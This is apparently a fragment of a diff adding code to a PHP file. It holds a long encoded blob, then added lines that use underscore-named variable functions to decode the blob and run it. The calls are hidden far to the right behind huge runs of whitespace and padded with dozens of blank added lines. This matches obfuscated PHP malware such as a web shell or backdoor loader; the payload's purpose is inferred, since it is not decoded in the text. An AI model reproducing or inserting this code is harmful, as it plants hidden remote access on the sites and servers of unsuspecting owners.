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';
+
+        $___();$__________($______($__($_))); $________=$____();
+                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                             $_____();                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                       echo                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                      
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+                                                                                                                                                                                                                     $________;
